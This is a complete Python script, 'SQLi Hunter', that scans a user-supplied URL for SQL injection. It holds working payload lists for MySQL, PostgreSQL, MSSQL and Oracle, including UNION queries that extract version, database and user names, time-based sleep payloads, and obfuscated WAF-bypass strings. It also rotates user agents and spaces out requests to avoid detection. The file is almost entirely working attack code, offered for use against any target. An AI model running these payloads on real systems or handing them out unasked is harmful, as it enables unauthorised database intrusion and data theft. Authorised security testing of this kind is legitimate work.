#!/usr/bin/env python3
"""
SQLi Hunter - Automated SQL Injection Vulnerability Scanner
Supports multiple databases and WAF bypass techniques
"""

import requests
import re
import time
import argparse
import urllib.parse
from typing import List, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

class SQLiHunter:
    def __init__(self, target_url: str, verbose: bool = False, threads: int = 5):
        self.target_url = target_url
        self.verbose = verbose
        self.threads = threads
        self.vulnerabilities = []
        self.session = requests.Session()
        
        # User agents for WAF bypass
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        # SQL injection payloads for different databases
        self.payloads = {
            'basic': [
                "'",
                "''",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "' OR '1'='1'/*",
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or ('1'='1",
                "') or ('1'='1'--",
            ],
            'mysql': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' UNION SELECT @@version--",
                "' UNION SELECT database()--",
                "' UNION SELECT user()--",
            ],
            'postgresql': [
                "' UNION SELECT NULL--",
                "' AND 1=CAST(1 AS INT)--",
                "' AND pg_sleep(5)--",
                "' OR pg_sleep(5)--",
                "' UNION SELECT version()--",
                "' UNION SELECT current_database()--",
                "' UNION SELECT current_user--",
            ],
            'mssql': [
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' WAITFOR DELAY '0:0:5'--",
                "' OR WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT @@version--",
                "' UNION SELECT DB_NAME()--",
                "' UNION SELECT SYSTEM_USER--",
            ],
            'oracle': [
                "' UNION SELECT NULL FROM DUAL--",
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
                "' UNION SELECT banner FROM v$version--",
                "' UNION SELECT user FROM DUAL--",
            ],
            'waf_bypass': [
                "' /*!50000OR*/ '1'='1",
                "' %6Fr 1=1--",
                "' or 1=1%00",
                "' UnIoN SeLeCt NULL--",
                "' /*!12345UNION*/ /*!12345SELECT*/ NULL--",
                "' %55nion %53elect NULL--",
                "' uni%00on sel%00ect NULL--",
                "' OR '1'='1' AND '1'='1",
                "' || '1'='1",
                "' + '",
                "' concat('1','1')='11",
            ]
        }
        
        # Error patterns for different databases
        self.error_patterns = {
            'mysql': [
                r'SQL syntax.*?MySQL',
                r'Warning.*?mysql_.*',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'check the manual that corresponds to your MySQL',
            ],
            'postgresql': [
                r'PostgreSQL.*?ERROR',
                r'Warning.*?pg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'PG::SyntaxError',
            ],
            'mssql': [
                r'Driver.*? SQL[\-\_\ ]*Server',
                r'OLE DB.*? SQL Server',
                r'\[SQL Server\]',
                r'\[Microsoft\]\[ODBC SQL Server Driver\]',
                r'\[SQLServer JDBC Driver\]',
                r'SqlException',
            ],
            'oracle': [
                r'ORA-[0-9][0-9][0-9][0-9]',
                r'Oracle error',
                r'Oracle.*?Driver',
                r'Warning.*?oci_.*',
                r'quoted string not properly terminated',
            ],
            'sqlite': [
                r'SQLite/JDBCDriver',
                r'SQLite.Exception',
                r'System.Data.SQLite.SQLiteException',
                r'Warning.*?sqlite_.*',
                r'SQLITE_ERROR',
            ]
        }

    def print_banner(self):
        banner = f"""
{Fore.GREEN}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   {Fore.CYAN}███████╗ ██████╗ ██╗     ██╗    ██╗  ██╗██╗   ██╗{Fore.GREEN}      ║
║   {Fore.CYAN}██╔════╝██╔═══██╗██║     ██║    ██║  ██║██║   ██║{Fore.GREEN}      ║
║   {Fore.CYAN}███████╗██║   ██║██║     ██║    ███████║██║   ██║{Fore.GREEN}      ║
║   {Fore.CYAN}╚════██║██║▄▄ ██║██║     ██║    ██╔══██║██║   ██║{Fore.GREEN}      ║
║   {Fore.CYAN}███████║╚██████╔╝███████╗██║    ██║  ██║╚██████╔╝{Fore.GREEN}      ║
║   {Fore.CYAN}╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝  ╚═╝ ╚═════╝{Fore.GREEN}       ║
║                                                           ║
║        {Fore.YELLOW}SQL Injection Vulnerability Scanner{Fore.GREEN}              ║
║           {Fore.WHITE}with WAF Bypass Capabilities{Fore.GREEN}                  ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def log(self, message: str, level: str = 'INFO'):
        colors = {
            'INFO': Fore.CYAN,
            'SUCCESS': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'VULN': Fore.MAGENTA
        }
        color = colors.get(level, Fore.WHITE)
        timestamp = time.strftime('%H:%M:%S')
        print(f"{Fore.WHITE}[{timestamp}] {color}[{level}]{Style.RESET_ALL} {message}")

    def extract_parameters(self, url: str) -> List[Tuple[str, str]]:
        """Extract GET parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return [(k, v[0]) for k, v in params.items()]

    def build_payload_url(self, base_url: str, param: str, payload: str) -> str:
        """Build URL with injected payload"""
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

    def detect_database(self, response_text: str) -> str:
        """Detect database type from error messages"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_type
        return 'unknown'

    def check_sql_error(self, response_text: str) -> Tuple[bool, str]:
        """Check if response contains SQL errors"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True, db_type
        return False, 'unknown'

    def test_payload(self, param: str, payload: str, payload_type: str) -> Dict:
        """Test a single payload against a parameter"""
        try:
            test_url = self.build_payload_url(self.target_url, param, payload)
            
            # Random user agent for WAF bypass
            headers = {
                'User-Agent': self.user_agents[int(time.time()) % len(self.user_agents)],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
            }
            
            start_time = time.time()
            response = self.session.get(test_url, headers=headers, timeout=10, verify=False)
            response_time = time.time() - start_time
            
            # Check for SQL errors
            has_error, db_type = self.check_sql_error(response.text)
            
            # Check for time-based injection
            is_time_based = 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload.lower()
            time_based_vuln = is_time_based and response_time > 4.5
            
            # Check for boolean-based injection
            is_boolean = '1=1' in payload or '1=2' in payload
            
            if has_error or time_based_vuln:
                return {
                    'vulnerable': True,
                    'param': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'db_type': db_type,
                    'response_time': response_time,
                    'error_based': has_error,
                    'time_based': time_based_vuln,
                    'url': test_url
                }
            
            if self.verbose:
                self.log(f"Testing {param} with {payload_type}: {payload[:50]}...", 'INFO')
                
        except requests.exceptions.Timeout:
            # Timeout might indicate time-based SQLi
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                return {
                    'vulnerable': True,
                    'param': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'db_type': 'unknown',
                    'response_time': 10.0,
                    'error_based': False,
                    'time_based': True,
                    'url': self.build_payload_url(self.target_url, param, payload)
                }
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing payload: {str(e)}", 'ERROR')
        
        return {'vulnerable': False}

    def scan_parameter(self, param: str) -> List[Dict]:
        """Scan a single parameter with all payloads"""
        vulnerabilities = []
        
        self.log(f"Scanning parameter: {Fore.YELLOW}{param}{Style.RESET_ALL}", 'INFO')
        
        # Test all payload types
        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                result = self.test_payload(param, payload, payload_type)
                if result['vulnerable']:
                    vulnerabilities.append(result)
                    self.log(
                        f"VULNERABILITY FOUND in {Fore.YELLOW}{param}{Style.RESET_ALL} "
                        f"using {Fore.CYAN}{payload_type}{Style.RESET_ALL} payload",
                        'VULN'
                    )
                    # Stop testing this parameter after finding vulnerability
                    return vulnerabilities
                
                # Small delay to avoid detection
                time.sleep(0.1)
        
        return vulnerabilities

    def scan(self):
        """Main scanning function"""
        self.print_banner()
        self.log(f"Target URL: {Fore.YELLOW}{self.target_url}{Style.RESET_ALL}", 'INFO')
        
        # Extract parameters
        parameters = self.extract_parameters(self.target_url)
        
        if not parameters:
            self.log("No parameters found in URL", 'ERROR')
            return
        
        self.log(f"Found {len(parameters)} parameter(s) to test", 'INFO')
        
        # Scan each parameter
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_param = {
                executor.submit(self.scan_parameter, param): param 
                for param, _ in parameters
            }
            
            for future in as_completed(future_to_param):
                param = future_to_param[future]
                try:
                    results = future.result()
                    self.vulnerabilities.extend(results)
                except Exception as e:
                    self.log(f"Error scanning {param}: {str(e)}", 'ERROR')
        
        # Print results
        self.print_results()

    def print_results(self):
        """Print scan results"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}SCAN RESULTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if not self.vulnerabilities:
            self.log("No SQL injection vulnerabilities found", 'SUCCESS')
            return
        
        self.log(f"Found {len(self.vulnerabilities)} SQL injection vulnerability/vulnerabilities!", 'VULN')
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{Fore.RED}[Vulnerability #{i}]{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}Parameter:{Style.RESET_ALL} {Fore.YELLOW}{vuln['param']}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}Payload Type:{Style.RESET_ALL} {Fore.CYAN}{vuln['payload_type']}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}Payload:{Style.RESET_ALL} {vuln['payload']}")
            print(f"  {Fore.WHITE}Database:{Style.RESET_ALL} {Fore.MAGENTA}{vuln['db_type'].upper()}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}Attack Type:{Style.RESET_ALL}", end=" ")
            if vuln['error_based']:
                print(f"{Fore.RED}Error-Based{Style.RESET_ALL}", end=" ")
            if vuln['time_based']:
                print(f"{Fore.YELLOW}Time-Based{Style.RESET_ALL}", end=" ")
            print()
            print(f"  {Fore.WHITE}Response Time:{Style.RESET_ALL} {vuln['response_time']:.2f}s")
            print(f"  {Fore.WHITE}Vulnerable URL:{Style.RESET_ALL}")
            print(f"    {Fore.BLUE}{vuln['url'][:100]}...{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def main():
    parser = argparse.ArgumentParser(
        description='SQLi Hunter - Automated SQL Injection Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_hunter.py -u "http://example.com/page?id=1"
  python sqli_hunter.py -u "http://example.com/page?id=1&name=admin" -v
  python sqli_hunter.py -u "http://example.com/page?id=1" -t 10
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid URL. Must start with http:// or https://")
        sys.exit(1)
    
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Create scanner and run
    scanner = SQLiHunter(args.url, verbose=args.verbose, threads=args.threads)
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()